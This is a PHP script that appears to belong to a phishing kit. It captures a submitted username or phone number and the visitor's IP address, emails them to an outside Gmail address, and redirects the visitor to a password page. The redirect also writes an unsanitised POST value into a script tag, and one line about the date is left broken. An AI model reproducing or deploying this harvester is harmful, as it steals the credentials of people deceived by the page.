<?php
session_start();

$_SESSION['number'] = $_POST['username'];

include("iplogger.php");
if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{   $ip = getenv("REMOTE_ADDR");
    $subject = "Bundle log";
    $to = "bundleafrica13@gmail.com";  
    $data = "number:" .$_SESSION['number']."\n".
            "IP : ".$ip."\n";$IP=$_POST['IP'];
            "Date:"     .(new DateTime("now", new DateTimeZone('Asia/Karachi')))->format('Y-m-d H:i:sA')."\n\n";                        
    $message = $data ;  
    mail($to, $subject, $message);
}
if(isset($_POST['link'])) echo "<script>window.location.replace('".$_POST['link']."');</script>";
else echo "<script>window.location.replace('../././websites/password.html');</script>";
?>
